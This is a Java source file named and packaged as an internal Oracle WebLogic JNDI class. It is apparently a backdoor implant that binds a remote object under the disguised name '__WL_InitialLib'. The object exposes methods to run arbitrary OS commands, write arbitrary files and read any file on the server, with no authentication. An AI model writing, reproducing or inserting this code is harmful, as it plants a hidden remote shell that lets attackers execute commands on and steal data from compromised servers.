package weblogic.jndi.internal;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.rmi.RemoteException;

import javax.naming.Context;
import javax.naming.InitialContext;

public class InitAppImpl implements InitApp {
	private String name;
	  
	public InitAppImpl(String s)
			throws RemoteException
	{
	    this.name = s;
	}
	@Override
	public String runCmd(String[] cmd) {
		// TODO Auto-generated method stub
		try
	      {
	        Process proc = Runtime.getRuntime().exec(cmd);
	        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
	        StringBuffer sb = new StringBuffer();
	        String line=null;
	        while ((line=br.readLine()) != null) {
	        	sb.append(line+"\n");
	        }
	        return sb.toString();
	      }
	      catch(Exception e)
	      {
	    	  System.out.print(e.getMessage());
	          return e.getMessage();
	      }	
		}
	@Override
	public String putFile(byte Content[], String Path) {
		// TODO Auto-generated method stub
		try
	      {
	          FileOutputStream fo=new FileOutputStream(Path);
	          fo.write(Content);
	          fo.close();
	          return "ok";
	       }
	      catch(Exception e)
	      {
	          //return e.getMessage();
	          return "fail";
	      }
	}
	@Override
	public byte[] getFile(String Path) {
		// TODO Auto-generated method stub
		File file = new File(Path);  
        Long filelength = file.length();  
        byte[] filecontent = new byte[filelength.intValue()];  
        try {  
            FileInputStream in = new FileInputStream(file);  
            in.read(filecontent);  
            in.close();  
            return filecontent;
        } catch (FileNotFoundException e) {  
            e.printStackTrace();  
            return new byte[0];
        } catch (IOException e) {  
            e.printStackTrace();  
            return new byte[0];
        }  	
	}
	public static void main(String args[]) throws Exception { 
	    try {
	      InitAppImpl obj = new InitAppImpl("__WL_InitialLib");
	      Context ctx = new InitialContext();
	      ctx.bind("__WL_InitialLib", obj);   
	      //ctx.unbind("__WL_InitialLib");
	    }
	    catch (Exception e) {
	      System.err.println("__WL_InitialLib: an exception occurred:");
	      System.err.println(e.getMessage());
	      throw e;
	    }
	  }
}
